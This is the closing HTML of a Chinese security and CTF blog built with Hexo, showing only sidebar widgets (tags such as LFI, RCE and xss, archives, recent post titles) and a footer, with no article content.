class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/10/01/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/">在线oj获取数据</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/">巅峰极客</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E6%88%91%E7%9A%842020/">我的2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>